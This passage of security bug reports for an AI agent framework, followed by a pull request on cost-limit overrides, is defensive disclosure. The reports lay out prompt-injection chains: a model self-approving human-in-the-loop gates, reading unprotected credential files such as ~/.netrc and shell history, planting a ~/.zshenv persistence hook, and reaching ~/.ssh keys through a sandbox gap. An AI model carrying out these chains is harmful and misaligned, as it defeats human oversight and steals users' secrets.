exposed.** No data leaves. The loss is control: human-in-the-loop SOP gates are cleared by the agent itself, with the ledger recording a "CLI" approval nobody made, and the daemon can be stopped or reloaded by any local process. `/admin/sop/logs` and `/admin/sop/pending` also expose run metadata to any local account. **Attack path** ```mermaid sequenceDiagram autonumber participant X as Untrusted content participant M as Model participant P as SecurityPolicy participant S as python approve.py
(sandboxed, localhost allowed) participant G as Gateway 127.0.0.1:42617 participant E as SOP engine
(OutOfBandRequired) X->>M: injected instruction M->>P: file_write approve.py P-->>M: allowed (workspace write) M->>P: shell "python approve.py" P-->>M: allowed (python allowlisted, Low risk, file content not inspected) S->>G: GET /admin/sop/pending G-->>S: run ids (loopback: allowed) S->>G: POST /admin/sop/approve {run_id} G->>E: resolve_gate(principal = cli(None)) E-->>G: cleared: source != Agent counts as out-of-band Note over E: ledger records a CLI approval no human made ``` **Data flow** ```mermaid flowchart LR A["agent subprocess"] --> B{"can it reach 127.0.0.1:42617?"} B -->|"macOS Seatbelt: localhost:* allowed"| Y["yes"] B -->|"Linux Landlock: no network rules"| Y B -->|"no sandbox (stock Linux, Windows)"| Y B -->|"Firejail --net=none"| N["no"] Y --> R["/admin/shutdown, /admin/reload,
/admin/sop/*: loopback = trusted"] T["tunnel (cloudflared, tailscale serve, ngrok)
forwards internet clients to loopback"] --> R R --> O["gate cleared as cli(None), daemon stopped or reloaded"] F["fixed precedent: /admin/paircode requires
the owner-only admin token (#11177)"] -. "apply to these routes" .-> R classDef bad fill:#fde2e2,stroke:#b00000,color:#000 classDef good fill:#e2f5e2,stroke:#008000,color:#000 class Y,R,O,T bad class N,F good ``` **Evidence:** static review of master `1c1cd118ac`; the chain was not executed against a running daemon. ### Logs / stack traces _No response_ ### ZeroClaw version master `1c1cd118ac` (v0.8.7) ### Rust version 1.98.0 (CI toolchain) ### Operating system any (macOS, Linux, Windows) ### Regression? Unknown ### Pre-flight checks - [ ] I reproduced this on the latest master branch or latest release. - [x] I redacted secrets, tokens, and personal data from all submitted content.

### Affected component

security/sandbox

### Severity

S2 - degraded behavior

### Current behavior

The Unix `default_forbidden_paths()` (`crates/zeroclaw-config/src/policy.rs:479-501`) covers the system directories plus `~/.ssh`, `~/.gnupg`, `~/.aws` and `~/.config`. Two classes of user secrets are outside every entry:

1. macOS keeps application state under `~/Library`, which has no entry: `~/Library/Keychains/login.keychain-db` (readable by the user; its contents are encrypted with the login password, so a copy is an offline-cracking target), `~/Library/Application Support/<app>` (tokens and session state for Slack, Discord, VS Code, browsers), `~/Library/Cookies`, `~/Library/Group Containers` and `~/Library/Containers` (sandboxed-app data), `~/Library/Messages/chat.db`, `~/Library/Safari`, `~/Library/Mail`, and `~/Library/LaunchAgents`, where a plist the agent writes runs at the next login (a persistence path, the write-side twin of the read exposure). Some of these are additionally gated by TCC's Full Disk Access depending on how the daemon was launched; the policy should not depend on that.
2. Credential files that are not under `~/.config` on any Unix: `~/.netrc` (plaintext passwords for curl and git), `~/.git-credentials` (plaintext), `~/.npmrc` (auth tokens), `~/.docker/config.json` (registry auth), `~/.kube/config` (cluster credentials), `~/.cargo/credentials.toml`, `~/.pypirc`, `~/.gem/credentials`, `~/.terraform.d/credentials.tfrc.json`, `~/.azure`, and the shell history files `~/.zsh_history` and `~/.bash_history`, which routinely contain tokens typed into commands.

The list is decisive in the same configurations #12134 describes: a workspace or allowed root over the home directory, `workspace_only = false`, every `level = "full"` profile (which forces `workspace_only` off, `policy.rs:4670`), and the `yolo` preset. The OS sandbox wraps spawned children only, so the in-process `file_read`, `file_edit`, `content_search` and RPC file reads have only this list between them and the files. #12124 covers the Windows equivalents; #12134 covers WSL mounts and drive roots; this issue covers the macOS tree and the credential dotfiles.

### Expected behavior

Add to the Unix defaults: `~/Library/Keychains`, `~/Library/Cookies`, `~/Library/Application Support`, `~/Library/Group Containers`, `~/Library/Containers`, `~/Library/Messages`, `~/Library/Safari`, `~/Library/Mail`, `~/Library/LaunchAgents` (or `~/Library` wholesale, relying on the most-specific-match rule to keep a workspace under it working), plus `~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.docker`, `~/.kube`, `~/.cargo/credentials.toml`, `~/.pypirc`, `~/.gem`, `~/.terraform.d`, `~/.azure`, `~/.zsh_history`, `~/.bash_history`. Document both platform lists in `docs/book/src/security/model.md` next to the existing ones. Like #12134, this is a behaviour change for operators who roam those trees under Full autonomy, with `allowed_roots` as the opt-in.

### Steps to reproduce

```bash
# macOS, workspace_dir = "~" (or workspace_only = false, or level = "full")
# file_read  path="~/.netrc"                                  -> contents returned
# file_read  path="~/Library/Keychains/login.keychain-db"     -> bytes returned
# file_read  path="~/.zsh_history"                            -> contents returned
# file_read  path="~/.ssh/id_ed25519"                         -> refused by the default ~/.ssh entry
```

### Impact

**Attack vector.** Prompt injection: the model reads one of the paths above with `file_read`, `content_search` or a shell `cat`, and exfiltrates it through any tool with network access.

Preconditions: the home directory reachable through the workspace or an allowed root, `workspace_only = false`, or a `level = "full"` profile.

**Likelihood.** Moderate under those configurations; the locations are well known and the request is a plain path.

**Data exposed.** The login keychain for offline cracking, application session tokens, plaintext git, netrc, npm, Docker registry and Kubernetes credentials, and secrets typed into shell commands.

**Data flow**

```mermaid
flowchart LR
    subgraph covered ["Unix defaults today"]
        U1["~/.ssh"]
        U2["~/.gnupg"]
        U3["~/.aws"]
        U4["~/.config"]
    end
    subgraph missing ["Not covered today"]
        L1["~/Library/Keychains (login keychain)"]
        L2["~/Library/Application Support (app tokens)"]
        L3["~/Library/Cookies, Containers, Group Containers"]
        C1["~/.netrc, ~/.git-credentials (plaintext)"]
        C2["~/.npmrc, ~/.docker/config.json, ~/.kube/config"]
        C3["~/.zsh_history, ~/.bash_history"]
    end
    M["model via file_read / content_search / shell"] --> L1 & L2 & L3 & C1 & C2 & C3
    M -. "refused" .-> U1
    classDef bad fill:#fde2e2,stroke:#b00000,color:#000
    classDef good fill:#e2f5e2,stroke:#008000,color:#000
    class L1,L2,L3,C1,C2,C3 bad
    class U1,U2,U3,U4 good
```

**Evidence:** static review of master `1c1cd118ac`; paths confirmed to exist on this Mac. Not executed through the tools.

### Logs / stack traces

_No response_

### ZeroClaw version

master `1c1cd118ac` (v0.8.7)

### Rust version

1.98.0 (CI toolchain)

### Operating system

macOS 26.5.1 (the dotfile part applies to Linux too)

### Regression?

Unknown

- [ ] I reproduced this on the latest master branch or latest release.
- [x] I redacted secrets, tokens, and personal data from all submitted content.

### Affected component security/sandbox ### Severity S1 - workflow blocked (allowlist bypass plus persistence; S0 is defensible) ### Current behavior On macOS and Linux the native runtime prefers the account's login shell (`login_shell()` through `getpwuid_r`, `crates/zeroclaw-config/src/platform/native.rs:33-40`, `125-160`), and `is_supported_login_shell` accepts zsh (`native.rs:70-76`). macOS's default login shell is zsh. `build_shell_command` spawns ` -c ` with no `-f` or `--no-rcs` (`native.rs:449-452`); `HOME` is forwarded to the child (`tools/shell_env.rs:11-13`) and `ZDOTDIR` is not set, so zsh reads `$HOME/.zshenv` before every command. The zsh manual: `/etc/zshenv` and then `$ZDOTDIR/.zshenv` are read for every zsh instance while RCS is set (the default); only `-f` (NO_RCS) skips the second; "If ZDOTDIR is unset, HOME is used instead". Cron jobs and `skill_tool` use the same `build_shell_command`. Verified on this Mac (zsh 5.9): with `HOME` pointing at a directory holding `.zshenv` containing `echo ZSHENV_HOOK_RAN`, `zsh -c 'echo command_output'` prints `ZSHENV_HOOK_RAN` then `command_output`; `zsh -f -c` prints only `command_output`; `bash -c` reads neither `.bashrc` nor `.bash_profile`. Who can write `~/.zshenv`: `file_write` confines writes to the workspace and allowed roots only while `workspace_only` is on, and `~/.zshenv` is in none of the default `forbidden_paths` (`~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.config`). So the file is writable when the workspace or an allowed root covers the home directory, when the operator sets `workspace_only = false`, and under every `level = "full"` risk profile, which forces `workspace_only` off (`from_risk_profile`, `policy.rs:4670`) while still enforcing `allowed_commands`. The shell path scanner lets `printf ... > ~/.zshenv` through under the same conditions. Sandbox interplay: Seatbelt today refuses dotfile reads only because its home grant is mis-escaped (companion issue), and it allows reads under the workspace and roots, so a workspace over home reads the hook. Stock Linux builds have no Landlock feature and use Firejail only when installed; with no sandbox the hook runs unconditionally, and a Linux account whose login shell is zsh is affected the same way. Effect: the next allowlisted command (`git status`) first runs the attacker's lines as the daemon's account with the daemon's environment. `~/.zshenv` is also sourced by every zsh the user starts interactively, so the hook persists into the operator's own terminals after the agent session ends. ### Expected behavior Agent-spawned shells read no user startup files: spawn zsh with `-f` (NO_RCS; `/etc/zshenv` still runs and is root-owned), or set `ZDOTDIR` to an empty private directory for the child. For symmetry pass `--norc --noprofile` to bash and keep `BASH_ENV` and `ENV` out of the child environment (they already are). Add the startup files (`~/.zshenv`, `~/.zprofile`, `~/.zshrc`, `~/.zlogin`, `~/.bash_profile`, `~/.bashrc`, `~/.bash_login`, `~/.profile`) to the default `forbidden_paths` as defense in depth, so a workspace over home cannot write them. A test runs the shell tool with a fixture `HOME` containing `.zshenv` and asserts the marker never appears in the output. ### Steps to reproduce ```bash # macOS (login shell zsh). Agent: Supervised, allowed_commands = ["git"], and either # workspace_dir = "~", or workspace_only = false, or a risk profile with level = "full". # 1. file_write path="~/.zshenv" content="echo HOOKED\n" (an attacker would use a beacon or reverse shell) # 2. shell command="git status" # -> output starts with HOOKED, then git's output; policy logged an allowlisted Low-risk git # 3. Open a new Terminal window: HOOKED prints there too. # # Shell-only check of the mechanism: mkdir -p /tmp/h && printf 'echo HOOKED\n' > /tmp/h/.zshenv env -i HOME=/tmp/h PATH=/usr/bin:/bin /bin/zsh -c 'echo cmd' # HOOKED, cmd env -i HOME=/tmp/h PATH=/usr/bin:/bin /bin/zsh -f -c 'echo cmd' # cmd ``` ### Impact **Attack vector.** Prompt injection (a web page, email, chat message or file the agent reads) gets the model to write `~/.zshenv` with `file_write`, then any later allowlisted command, including a harmless `git status`, runs the hook first. No command the policy evaluates contains anything suspicious. The hook also runs in the user's own shells. Preconditions: zsh as the login shell (every macOS account by default, Linux accounts that chose zsh), and one of: the workspace or an allowed root covering `$HOME`, `workspace_only = false`, or a `level = "full"` profile. **Likelihood.** Moderate to high. `level = "full"` is the usual setting for coding agents (the configuration in #10536 uses it) and it silently turns `workspace_only` off, and "assistant over my home folder" workspaces are common. Low only under the default Supervised profile with the default workspace. **Data exposed.** Arbitrary code as the user: every file the user can read, outbound network, and persistence across sessions through the user's interactive shells, which run with the user's full environment (SSH agent, keychain-unlocked credentials, tokens in their shell profile). **Attack path** ```mermaid sequenceDiagram autonumber participant X as Untrusted content participant M as Model participant P as SecurityPolicy participant Z as /bin/zsh -c (login shell) participant H as ~/.zshenv X->>M: injected instruction M->>P: file_write ~/.zshenv P-->>M: allowed (home inside the workspace, or workspace_only off, or level = full) M->>P: shell "git status" P-->>M: allowed (git allowlisted, Low risk) Z->>H: read $HOME/.zshenv (RCS is on, no -f, no ZDOTDIR) H-->>Z: attacker's commands run first, as the daemon account Z->>Z: then git status Note over H: every zsh the user opens later runs the hook too ``` **Data flow** ```mermaid flowchart LR A["native runtime picks the login shell: /bin/zsh"] --> B["spawn: zsh -c command
HOME forwarded, no -f, no ZDOTDIR"] B --> C["zsh reads /etc/zshenv then $HOME/.zshenv
for every instance"] W{"can the agent write ~/.zshenv?"} W -->|"workspace over home"| Y["yes"] W -->|"workspace_only = false"| Y W -->|"level = full forces workspace_only off"| Y W -->|"default Supervised, default workspace"| N["no"] Y --> C C --> E["hook runs before each allowlisted command
and in the user's own terminals"] FIX["expected: zsh -f or ZDOTDIR to an empty dir,
rc files in forbidden_paths"] -. "removes the read" .-> C classDef bad fill:#fde2e2,stroke:#b00000,color:#000 classDef good fill:#e2f5e2,stroke:#008000,color:#000 class B,C,Y,E bad class FIX,N good ``` **Evidence:** code reading of master `1c1cd118ac`; the zsh behaviour executed on this Mac (zsh 5.9, macOS 26.5.1) and matches the zsh manual's Startup/Shutdown Files section. The end-to-end chain through the tools was not executed. ### Logs / stack traces _No response_ ### ZeroClaw version master `1c1cd118ac` (v0.8.7) ### Rust version 1.98.0 (CI toolchain) ### Operating system macOS 26.5.1 (also Linux with a zsh login shell) ### Regression? Unknown ### Pre-flight checks - [ ] I reproduced this on the latest master branch or latest release. - [x] I redacted secrets, tokens, and personal data from all submitted content.

### Affected component security/sandbox ### Severity S1 - workflow blocked ### Current behavior `generate_policy` (`crates/zeroclaw-runtime/src/security/seatbelt.rs:272-380`) builds the SBPL profile inside a Rust raw string (`r#"..."#`), and the rule commented "Allow reading user home for tool configs" is written as ```text (allow file-read* (regex #"^/Users/[^/]+/\\.")) ``` (`seatbelt.rs:341-343`). A raw string keeps both backslashes, so sandbox-exec receives `\\.`. In an SBPL `#"..."` regex literal `\\` is an escaped backslash and `.` is any character, so the rule matches `/Users//\x...` and never a dotfile; Apple's own profiles write `\.`. The rule has been this way since the profile was added (`32edadc256`, #4592). Verified on macOS 26.5.1 with a profile that reproduces the generated rules (system subpaths, temp directories, `process-exec`): | Probe | generated rule (`\\.`) | corrected rule (`\.`) | no rule | |---|---|---|---| | `wc -c ~/.actrc` | `open: Operation not permitted` | `93` | `open: Operation not permitted` | | `wc -c ~/Applications` (control, no dot) | denied | denied | denied | | `~/.cargo/bin/cargo --version` | `execvp() ... Operation not permitted` | launches | denied | Seatbelt is the default backend on macOS: `SandboxBackend::Auto` is the default (`schema.rs:19920-19923`) and auto-detection selects sandbox-exec whenever `/usr/bin/sandbox-exec` exists (`detect.rs:370-376`), so every stock macOS install runs the shell tool under this profile. Consequence: anything installed or configured under a dot directory is unreachable for sandboxed commands: rustup's `cargo` (`~/.cargo/bin`, and `~/.cargo/registry` for any build), nvm's `node` and `npm` (`~/.nvm`), pyenv (`~/.pyenv`), uv and pipx tools (`~/.local/bin`), and the configs `~/.gitconfig`, `~/.npmrc`, `~/.cargo/config.toml`. `cargo`, `node`, `npm`, `python` and `pip` are in the default allowlist (`policy.rs:443-447`). The sandboxing docs attribute the resulting "Operation not permitted" errors to tools that "don't cooperate with Seatbelt's file-access rules" and recommend switching to Docker (`docs/book/src/security/sandboxing.md:189`). **Security constraint on the fix.** The rule as intended grants read access to every dotfile and dot-directory of every account under `/Users`, including `~/.ssh`, `~/.gnupg`, `~/.aws` and `~/.config` (the default `forbidden_paths`) and `~/.zsh_history`, `~/.netrc`, `~/.docker/config.json`. The shell path scanner cannot see inside a workspace script, so `file_write read.py` followed by the allowlisted `python read.py` reads `~/.ssh/id_ed25519` with no policy refusal; only the sandbox can stop it, and the Linux Landlock backend grants no home access at all (`landlock.rs:105-160`: system paths and policy roots only). Today the broken regex accidentally gives macOS the stronger posture. A one-character fix would hand the sandbox exactly the exception the policy forbids. (A related consequence: the `~/.zshenv` hook in the companion issue is currently blocked under Seatbelt unless the home directory is inside a policy root.) ### Expected behavior The grant does what its comment says, scoped so it cannot contradict `forbidden_paths`: - Fix the escaping (`\.`), restrict the match to the daemon's own home directory rather than `/Users/[^/]+`, and either enumerate the tool directories that need it (`~/.cargo`, `~/.rustup`, `~/.nvm`, `~/.pyenv`, `~/.local`, `~/.npm`, `~/.gitconfig`, `~/.npmrc`) or keep the blanket dotfile grant and follow it with `(deny file-read* (subpath ...))` for every resolved `forbidden_paths` entry. Seatbelt applies the last matching rule, which the profile already relies on (`seatbelt.rs:290-292`). - An integration test gated on `SANDBOX_EXEC_PATH` like the existing ones (`seatbelt.rs:792-800`): a dotfile under `$HOME` outside `forbidden_paths` is readable, a fixture under `~/.ssh` is not, and `cargo --version` from `~/.cargo/bin` launches. - Replace the docs paragraph that blames the tools. ### Steps to reproduce ```bash # macOS with sandbox-exec and a rustup toolchain (cargo in ~/.cargo/bin) cat > /tmp/zc.sb <<'SB' (version 1) (deny default) (allow process-exec) (allow process-fork) (allow signal (target self)) (allow file-read* (subpath "/usr") (subpath "/bin") (subpath "/sbin") (subpath "/Library") (subpath "/System") (subpath "/private/var") (subpath "/dev") (subpath "/etc") (subpath "/Applications") (subpath "/opt") (literal "/") (subpath "/var")) (allow file-read* (subpath "/tmp")) (allow file-read* (subpath "/private/tmp")) (allow file-read* (regex #"^/private/var/folders/")) (allow file-read* (regex #"^/Users/[^/]+/\\.")) (allow file-write* (subpath "/dev/null")) (allow sysctl-read) (allow mach-task-name) SB sandbox-exec -f /tmp/zc.sb /usr/bin/wc -c ~/.zshrc # Operation not permitted sandbox-exec -f /tmp/zc.sb ~/.cargo/bin/cargo --version # execvp() failed: Operation not permitted sed -i '' 's|/\\\\\\\\\.|/\\\\.|' /tmp/zc.sb # change \\. to \. sandbox-exec -f /tmp/zc.sb /usr/bin/wc -c ~/.zshrc # byte count printed # Through ZeroClaw: default config on macOS, shell "cargo --version" -> Operation not permitted ``` ### Impact **Attack vector.** None for the defect itself: it fails closed. The security content is the constraint on the fix described above. **Likelihood.** Every macOS install whose developer tools come from rustup, nvm, pyenv, uv or pipx, which is most developer Macs, hits this on the first `cargo`, `node` or `python` command through the shell tool. The docs steer those users to Docker instead of naming the cause. **Data exposed.** None today. A naive fix exposes `~/.ssh`, `~/.aws`, `~/.gnupg`, shell history and credential dotfiles to any allowlisted interpreter running a workspace script, on the platform whose sandbox is meant to be the backstop. **Data flow** ```mermaid flowchart LR R["Rust raw string r#...#
(regex #"^/Users/[^/]+/\\.")"] --> P["generated .sb profile
contains \\. (two backslashes)"] P --> I["SBPL regex meaning:
escaped backslash, then any character"] I --> X["never matches /Users/name/.cargo, ~/.gitconfig, ~/.nvm ..."] X --> D["cargo, node, python from dot directories:
execvp Operation not permitted"] F["naive fix: \\. becomes \."] --> G["sandbox grants every dotfile under /Users/*
including ~/.ssh, ~/.aws, ~/.gnupg, ~/.config"] G --> H["file_write read.py + allowlisted python read.py
reads ~/.ssh/id_ed25519, policy never sees the path"] classDef bad fill:#fde2e2,stroke:#b00000,color:#000 classDef warn fill:#fff4d6,stroke:#b36b00,color:#000 class P,I,X,D bad class G,H warn ``` **Attack path if fixed naively** ```mermaid sequenceDiagram autonumber participant X as Untrusted content participant M as Model participant P as SecurityPolicy participant S as sandbox-exec (Seatbelt) participant F as ~/.ssh/id_ed25519 X->>M: injected instruction M->>P: file_write read.py (prints the key file) P-->>M: allowed, in-workspace write M->>P: shell "python read.py" P-->>M: allowed, python is allowlisted and read.py is a workspace path S->>F: open() under the corrected blanket dotfile grant F-->>M: key material in the tool output Note over P: forbidden_paths never evaluated: the path lives inside the script ``` **Evidence:** code reading of master `1c1cd118ac` and the experiments above, executed on this Mac (macOS 26.5.1). ### Logs / stack traces _No response_ ### ZeroClaw version master `1c1cd118ac` (v0.8.7) ### Rust version 1.98.0 (CI toolchain) ### Operating system macOS 26.5.1 (any macOS with sandbox-exec) ### Regression? No, first-time setup ### Pre-flight checks - [ ] I reproduced this on the latest master branch or latest release. - [x] I redacted secrets, tokens, and personal data from all submitted content.

prs.title: feat(runtime): let the operator override an exceeded cost limit
prs.body:
## Summary

- **Base branch:** `master` (all contributions)
- **What changed and why:**
  - `cost.allow_override` was documented but read by nothing, so an exceeded shared limit always failed the turn and the only way on was a daemon restart. With it on, the main tool loop now pauses before a provider call that would exceed the shared daily or monthly limit and asks through the turn's approval channel (`tool_name = cost_limit_override`, exported as `COST_LIMIT_OVERRIDE_APPROVAL`). Deny, no answer within 10 minutes, or a channel that cannot ask stops the turn exactly as before. ZeroCode and Telegram wait the full 10 minutes; ACP waits the shorter of 10 minutes and `acp.session_timeout_secs`, because the ACP channel uses the trait's default timeout; other chat channels keep their own `approval_timeout_secs` (300 s by default), so there the shorter wait applies.
  - Approval calls `CostTracker::grant_override`, which records the override for the current UTC day or month on state shared by every derived tracker, so one answer covers every session and delegation of the daemon. `check_budget` skips that limit (and its warning) while the stored period matches, so it expires on its own at rollover. Per-hop and per-agent ceilings still bind, and `grant_override` refuses when `allow_override` is off.
  - The grant is kept in memory only. It ends at the next UTC day or month rollover, or when the daemon restarts, and a restart restores enforcement. Nothing is written to `state/cost-overrides.json`; a file left by an earlier build is ignored.
  - A turn waiting on its own prompt also watches for a grant from another session (a `watch` channel on the tracker). When one arrives it drops its request and continues. `RpcApprovalChannel` sends a new `session/update` type, `approval_withdrawn` (`request_id`), for any approval that ends without an answer from its client, and ZeroCode takes that prompt down. Before this, approving in one session left the same prompt up in the other, and that turn stopped at the 10-minute timeout although the limit was already lifted.
  - `RpcApprovalChannel` and `AskUserApprovalBridge` now implement `request_approval_attributed_with_timeout`. The trait default wrapped `request_approval_attributed`, whose own 120 s deadline fired first, so the 10-minute wait would have been cut short.
  - ZeroCode renders a `cost_limit_override` approval as a centred, bold red notice with Override and Stop buttons instead of the tool card. Only Override or Stop (key or click) closes it. If the daemon refuses the answer (for example `FORBIDDEN`), the notice comes back with the error so the user can answer again; a timeout shows the error without bringing the notice back, because the daemon may already have the answer.
- **Scope boundary:** no warning at `warn_at_percent` (#10950) and no notice for a turn that stops with no override possible; both need a daemon-to-client budget event this PR does not add. `cost.enforcement.mode` stays unread. Applying `config/set` limit changes to the live tracker is #11587.
- **Holding-crate exception:** the #11589 row in `crates/zeroclaw-runtime/AGENTS.md` covers `src/agent/{approval_bridge,cost}.rs`, `src/agent/turn/{approval_gate,mod,provider_call}.rs`, `src/rpc/approval_channel.rs` and `locales/en/cli.ftl`. It doesn't yet cover the RPC enforcement adapter in `src/rpc/{context,dispatch,local}.rs`, or the attribution-only edits in `src/agent/agent.rs`, `src/daemon/mod.rs` and `src/integrations/registry.rs`. The ancestry, admission and binding rules themselves live in `zeroclaw-config` (`cost::override_grant`). A row amendment that covers these files and states the memory-only grant is drafted on fork branch `docs/runtime-exception-11589` (`e7868ca2a`, on `master` `1c1cd118a`). Like #11697, it needs its own Core Team-approved PR; this PR can't grant it.
- **Blast radius:** turns that hit a shared limit with `allow_override = true` now wait for an answer instead of failing, on any channel that answers approvals (ZeroCode, ACP, Telegram inline buttons). The approval bridge's timeout plumbing is used only by callers that pass a budget; tool approvals are unchanged.
- **Linked issue(s):** Related #11585
- **Labels:** (set after open)

### What this does, simply

ZeroClaw can stop the agent when spending passes a daily or monthly limit. There was a setting meant to let you go past the limit, but nothing used it: once the limit tripped, every message failed, and the only way to continue was to raise the limit and restart, which closes every open session.

Now, with that setting on, the agent pauses when it reaches the limit and ZeroCode shows a red box asking whether to keep going. Say yes and the same task carries on, and the limit stays lifted until the day (or month) ends or the daemon restarts. If several sessions were waiting at the limit, one yes lets all of them continue. Say no, or leave it for ten minutes, and the task stops as it does today. Chat apps that cannot show the question, and scheduled jobs, still stop at the limit.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** Yes
- **Interface(s) exercised:** `surface` `tui` (ZeroCode Code tab over RPC)
- **Setup / preconditions:** `[cost] enabled = true`, `allow_override = true`, `daily_limit_usd` just above today's recorded spend.
- **Steps to run:** in ZeroCode, run a prompt that makes a few model calls until spend passes the limit. When the red notice appears, click Override. Then open a second session and send a prompt. Separately: get two sessions waiting on the notice at once and Override in one; and restart the daemon after an Override and send a prompt.
- **Expected on this branch (after):** the first turn pauses on the red notice and continues after Override; the second session is not asked again; with two waiting, the other notice closes and its turn continues; after a daemon restart the limit is enforced again and the next turn asks again. With Stop instead, the turn ends with the budget error.
- **Prior behavior on `master` (before):** the turn fails with `Budget exceeded: ... Cannot make further API calls until the budget resets.`, there is no prompt, and every later turn fails until a restart.

### How I tested

- **Authority recheck after the peer lookup (head `5d2ca670b747`):** `session/approve` for a cost-override prompt now rechecks the admitted session, the caller's current `SessionApprove` grants and ownership, and the pending request's session binding after the peer-process lookup. It holds the authority lease through delivery, so no await sits between the last check and `resolve_from_operator`. A caller who lost `sessions:update` during the lookup gets `FORBIDDEN`, the prompt stays pending and no override is granted. New tests: `rpc::dispatch::tests::cost_override_approve_rechecks_authority_after_peer_lookup` pauses the lookup, revokes the grant and checks for no approval and no grant. `cost_override_approve_accepts_unchanged_authority_after_peer_lookup` is the control: the approval is acknowledged and the real budget gate grants the override. With only the test commit applied to `ab919d606c`, the revocation test fails (the old handler answers `acknowledged: true`) and the control passes. On this head, through the local cargo wrapper: `cargo fmt --all -- --check` clean; `cargo clippy -p zeroclaw-runtime --all-targets -- -D warnings` clean; `cargo test -p zeroclaw-runtime --lib` → `5902 passed; 2 failed`, the two being the `relay::local_dial_tests` loopback-stall tests that also fail on the base; `cargo test -p zeroclaw-runtime --test '*'` → all 15 integration binaries pass.
```sh
cargo fmt --all -- --check   # rustfmt --edition 2024 on the changed files
cargo clippy -p zeroclaw-api -p zeroclaw-config -p zeroclaw-runtime -p zerocode --all-targets -- -D warnings
cargo test -p zeroclaw-config --lib cost::tracker
cargo test -p zeroclaw-runtime --lib budget_override
cargo test -p zeroclaw-runtime --lib approval_
cargo test -p zeroclaw-runtime --lib -- budget_override_tests rpc::approval_channel
cargo test -p zerocode --bins -- approval parse_approval cost_limit
cargo test -p zerocode --bin zerocode cost_limit
cargo test -p zerocode --bin zerocode approval
scripts/ci/docs_quality_gate.sh
```

- **CI checks relied on and why they cover this change:** Rust test and clippy jobs for the four crates; Docs Style for `docs/book/src/ops/cost-tracking.md`.
- **Known CI coverage gap, if any:** no automated end-to-end test drives a real provider turn into the gate. The gate tests use a scoped tracker with a scripted channel. The live run above covers that path by hand at the current head.
- **Commands run and tail output:** current head `2830dc912` (`d01ad8eb1ad9` plus two ZeroCode-only fixes. Greptile 4429329518: a refused cost-limit answer brings the notice back and shows the error. Greptile 4429693704: a restored notice is cleared when its turn ends, so a refusal that also stopped the turn doesn't leave it up), Linux x86_64, rustc 1.98.0, in its own target dir (the log shows zerocode compiled from this tree):
  - `cargo test --locked -p zerocode --no-fail-fast -- --test-threads=4` → lib `52 passed`, bin `1566 passed; 0 failed; 2 ignored`, including `refused_cost_limit_answer_restores_the_notice_and_shows_the_error` (the daemon answers `FORBIDDEN`; the notice and request id come back, and the error text is shown; a following `TurnComplete` then clears the notice).
  - `cargo clippy --locked -p zerocode --all-targets -- -D warnings` → clean. `cargo fmt -p zerocode -- --check` → clean.
  - The runtime, config and api crates are unchanged since `d01ad8eb1ad9`, so the results below still apply to them.
- Previous head `d01ad8eb1ad9` (`d0297b2c4` narrow-pane fix plus a clean merge of `master` `1c1cd118a`), Linux x86_64:
  - `cargo test --locked -p zeroclaw-runtime -p zeroclaw-config -p zeroclaw-api --lib` → runtime `5905 passed; 0 failed; 9 ignored`, config `1834 passed; 0 failed`, api `322 passed; 0 failed`.
  - `cargo test --locked -p zerocode` → lib `52 passed`, bin `1564 passed; 1 failed`. The failure is `connection_tests::insecure_tls_prompt_preserves_default_sigint`, which also fails on `master` on this host. `cost_limit_notice_keeps_full_scope_timeout_and_buttons_visible` passes at widths 30, 40, 76 and 100.
  - `cargo +1.98.0 clippy --locked -p zeroclaw-runtime -p zeroclaw-config -p zeroclaw-api --all-targets -- -D warnings` and `cargo clippy -p zerocode --all-targets -- -D warnings` → clean. `cargo fmt --check` → clean.
  - CI for this head is pending. The Security job may fail on the new wasmtime advisories (RUSTSEC-2026-0420 to 0424) until #12129 lands. This PR doesn't touch wasmtime.
  - The earlier head `5d2ca670b7` had a green CI Required Gate.
- **Greptile round 3 (on the master merge `e7c4aa6b3f68`):** the typing wrapper now resumes typing when another session's grant releases a waiting prompt, and keeps it off for a cancelled turn (`abandoned_approval_resumes_typing_unless_the_turn_was_cancelled`, which fails with the guard disarmed). Clippy `-D warnings` clean on `zeroclaw-channels` and `zeroclaw-runtime`; channels `approval_typing abandoned_approval approval_wait_resumes unsupported_approval_resumes` 5 passed; rustfmt and the comment hygiene gate pass.
- **Beyond CI, what did you manually verify?** Coverage: tracker override (day lifts, rollover expiry, derived trackers share it, per-hop and per-agent ceilings still bind, day does not lift month, refused when not allowed); gate (approve continues and does not ask twice, deny and runtime timeout stop, no prompt without `allow_override` or a channel); RPC channel honours a 600 s budget through `dyn Channel`; ZeroCode notice render and button clicks; a restart restoring enforcement (grants are memory-only), cross-session release, `approval_withdrawn` sent only for unanswered prompts and cleared only for the matching id. I ran the override live in the experiment build; the two follow-up bugs above came from that run.
- **Visual interface evidence:** live run of the current head `d01ad8eb1ad9` (real X11 window captures, daemon and ZeroCode from the same debug build, priced local stub provider). [Manifest](https://github.com/Audacity88/zeroclaw/blob/evidence-screenshots/pr-11589/live-d01ad8eb1/MANIFEST.txt):
  - [Cost-limit prompt](https://raw.githubusercontent.com/Audacity88/zeroclaw/evidence-screenshots/pr-11589/live-d01ad8eb1/11589-L01-cost-limit-prompt-150x42.png); [Stop ends only that turn, no further provider call](https://raw.githubusercontent.com/Audacity88/zeroclaw/evidence-screenshots/pr-11589/live-d01ad8eb1/11589-L02-stop-ends-turn-150x42.png).
  - **Child-client IPC:** the daemon's `shell` tool opens a ZeroCode client (pid 3991336, a descendant of the daemon; see [ancestry](https://github.com/Audacity88/zeroclaw/blob/evidence-screenshots/pr-11589/live-d01ad8eb1/child-ancestry.txt)). Ctrl+O there [is refused and the turn stops](https://raw.githubusercontent.com/Audacity88/zeroclaw/evidence-screenshots/pr-11589/live-d01ad8eb1/11589-L05-child-client-ctrl-o-refused.png). The trace records `RPC cost override refused: independent operator process required` (`cost_override_untrusted_process`, `peer_pid` 3991336).
  - **Cross-session release:** with the child and a second, independent client both waiting, [Ctrl+O in the second client releases both turns](https://raw.githubusercontent.com/Audacity88/zeroclaw/evidence-screenshots/pr-11589/live-d01ad8eb1/11589-L07-grant-in-second-releases-child-desktop.png). It emits one `Approve` event, and [the main turn continues under the same grant](https://raw.githubusercontent.com/Audacity88/zeroclaw/evidence-screenshots/pr-11589/live-d01ad8eb1/11589-L08-main-turn-continues-under-grant-150x42.png).
